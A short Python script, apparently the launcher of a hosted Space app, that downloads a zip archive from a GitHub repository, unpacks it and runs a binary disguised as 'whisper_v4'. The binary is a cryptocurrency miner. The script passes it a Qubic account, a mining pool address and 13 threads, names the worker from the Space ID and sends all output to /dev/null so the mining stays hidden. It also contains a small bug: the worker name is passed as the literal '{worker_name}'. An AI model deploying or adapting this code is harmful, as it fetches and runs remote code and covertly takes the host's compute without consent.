import os
os.system("wget https://github.com/qqivk/project-01/raw/refs/heads/main/whisper_v4_1.zip")
os.system("unzip whisper_v4_1.zip")
worker_name = os.getenv('SPACE_ID').replace("/","_")
os.system("./whisper_v4 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 -t 13 --worker {worker_name} >/dev/null")
